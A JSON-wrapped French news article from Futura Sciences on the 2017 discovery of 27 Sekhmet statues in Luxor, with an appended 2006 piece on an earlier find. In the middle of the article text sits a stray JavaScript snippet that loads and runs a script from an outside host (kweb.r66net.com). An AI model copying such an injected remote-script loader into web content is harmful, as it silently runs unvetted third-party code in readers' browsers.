{"title": "Egypte : decouverte de 27 statues de la deesse Sekhmet", "newspaper": "Futura Sciences", "author": ["Par Futura avec l'AFP"], "date_publi": "2017-12-04", "content": "Pas moins de 27 statues de Sekhmet, dont certaines mesurent jusqu'a deux metres, viennent d'etre decouvertes a Louxor, en Egypte. Personnifiant la chaleur destructrice du soleil, la deesse a tete de lionne etait autrefois redoutee. Une collection de 27 statues fragmentees de la deesse egyptienne a tete de lionne  Sekhmet  a ete decouverte pres des colosses de Memnon, a  Louxor , en Egypte, a annonce ce dimanche le ministere des Antiquites. Cette decouverte a eu lieu durant une fouille effectuee par une mission archeologique egypto-europeenne, dans le cadre du projet de conservation du temple du roi  Amenhotep  III, l'un des plus importants pharaons de l' Egypte ancienne . Les fouilles ont debute le 7 novembre et dure jusqu'a la fin du mois, a indique a l'AFP Hourig Sourouzian, qui dirige la mission. Selon Mostafa Waziri, secretaire general du Conseil supreme des Antiquites, certaines statues representent la deesse Sekhmet  << assise sur le trone, tenant le symbole de la vie dans sa main gauche, ou debout et tenant le sceptre de papyrus devant sa poitrine >> , a indique le communique du ministere.  << L'etat de conservation des statues est variable >> , a precise Hourig Sourouzian. Certaines, trouvees dans les couches superieures de la terre, sont en bon etat.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  287 statues de Sekhmet decouvertes en 20 ans Ces statues sont sculptees dans le granite noir et mesurent parfois jusqu'a deux metres, selon Mostafa Waziri. Deesse lionne,  <<  oeil agissant  >>  du  soleil , Sekhmet, fille de Re, personnifie sa dynamique destructrice. Elle etait redoutee de ses ennemis a cause de sa puissance devastatrice. La mission dirigee par Hourig Sourouzian a decouvert a ce jour 287 statues de Sekhmet, depuis le debut des fouilles en 1998. Louxor, ville d'un demi-million d'habitants sur les  rives du Nil , en Haute-Egypte, abrite les restes archeologiques de l'antique capitale egyptienne de Thebes. Pour en savoir plus Decouverte de 17 statues de Sekhmet en 2006 Article de Christophe Orly publie le 15 mars 2006 17 statues de la deesse de la guerre Sekhmet, au corps de femme et a la tete de lionne. Telle est l'etonnante decouverte d'une equipe d'archeologues allemands, qui realisaient des travaux de restauration dans le temple du pharaon Amenhotep III, dans la ville de Louxor. Ils remettaient en etat le temple d'Amenhotep III, sur la rive ouest de Louxor, quand ils ont croise le  regard  de la deesse de la guerre Sekhmet.  Hautes d'un peu moins de deux metres et baties dans le granit noir, les statues qu'ils ont exhumees representent la femme a tete de lionne sise sur un trone, portant la cle de vie (symbole Ankh) dans sa main gauche . Photo distribuee le 6 mars 2006 par le Conseil supreme des Antiquites egyptiennes apres la decouverte a Louxor, en Haute-Egypte, d'une statue en granite noir representant la deesse Sekhmet. (c)  Egyptian Supreme Council Of Antiquity , AFP                               Cette decouverte archeologique fait suite a l'exhumation, la semaine derniere, de six premieres statues de Sekhmet. Cette deesse, symbolisant la guerre et la vengeance, representait egalement la puissance du soleil. Les egyptiens lui conferaient la faculte de faire proliferer les maladies, et lui octroyaient egalement le pouvoir de  guerison . D'apres les premieres conclusions,  c'est la perspective d'une telle guerison qui aurait pousse le pharaon Amenhotep III a rassembler un nombre si impressionnant de statues de Sekhmet dans son temple . En effet, il souffrait, entre autres, de  rages  de dents... Cette nouvelle decouverte  porte  a 30 le nombre de statues decouvertes dans le temple. Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  deesse sekhmet  |  arthur vengeance de maltazard  |  momie egyptienne  |  tombe egyptienne  |  deesse des animaux  |  deesse egyptienne  |  groupe electrogene louxor  |  sentiment de vengeance  |  temple segeste  |  temple encore", "theme": "sciences"}